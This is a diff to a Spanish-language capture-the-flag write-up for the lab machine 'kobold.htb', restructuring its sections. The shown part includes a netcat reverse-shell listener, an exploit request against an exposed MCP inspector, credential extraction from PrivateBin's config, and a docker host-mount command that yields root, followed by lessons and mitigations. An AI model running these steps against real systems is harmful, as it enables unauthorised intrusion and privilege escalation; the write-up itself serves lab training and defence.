@@ -37,7 +37,21 @@ mcp.kobold.htb    -> MCPJam Inspector
 bin.kobold.htb    -> PrivateBin
 ```
 
-## Foothold: CVE-2026-23744
+## Enumeración
+
+```bash
+id
+grep -E "ben|operator|docker" /etc/group
+```
+
+```text
+operator:x:1001:ben
+docker:x:998:ben
+```
+
+Dos caminos según lo que haya activo en la sesión; los grupos suplementarios no siempre se cargan en una shell nueva.
+
+## Foothold
 
 ```bash
 curl -s -X POST http://mcp.kobold.htb/api/mcp/connect \
@@ -59,21 +73,12 @@ nc -lvnp 4444
 uid=1000(ben) gid=1000(ben) groups=1000(ben)
 ```
 
-## Enumeración de grupos
+## Movimiento lateral
 
-```bash
-id
-grep -E "ben|operator|docker" /etc/group
-```
+- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
+- El detalle está en «Escalada de privilegios».
 
-```text
-operator:x:1001:ben
-docker:x:998:ben
-```
-
-Dos caminos según lo que haya activo en la sesión; los grupos suplementarios no siempre se cargan en una shell nueva.
-
-## Escalada I: PrivateBin y Arcane
+## Escalada de privilegios
 
 ```bash
 ls -ld /opt/privatebin/data /opt/privatebin/tpl
@@ -94,8 +99,6 @@ cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
 
 Esas credenciales valen para **Arcane** (`:3552`) como administrador.
 
-## Escalada II: contenedor privilegiado
-
 ```bash
 newgrp docker        # si el grupo existe pero no está cargado
 docker run -v /:/host --rm -it alpine chroot /host bash
@@ -107,16 +110,27 @@ root@kobold:/# cat /root/root.txt
 
 En Arcane el equivalente es crear un contenedor privilegiado con el volumen del host y entrar en él.
 
-## Evidencia (redactada)
+## Evidencia
 
 ```text
 /home/ben/user.txt  -> <user_flag>
 /root/root.txt      -> <root_flag>
 ```
 
-## Lecciones
+## Lecciones aprendidas
 
 - Las herramientas de desarrollo de IA (MCP, visores, agentes) asumen "entorno local de confianza"; expuestas a la red son RCE sin autenticación.
 - `spawn(comando_del_usuario)` sin allowlist es ejecución por diseño.
 - Pertenecer a `docker` (o a un grupo con escritura en un directorio que monta otro servicio) equivale a root.
 - Mitigación: autenticación y allowlist en el inspector, nunca exponerlo, grupos mínimos y PrivateBin con plantillas fijas y `open_basedir`.
+
+## Mitigaciones y detección
+
+- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+
+## Referencias
+
+- [CVE-2025-64714](https://nvd.nist.gov/vuln/detail/CVE-2025-64714)
+- [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
+- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
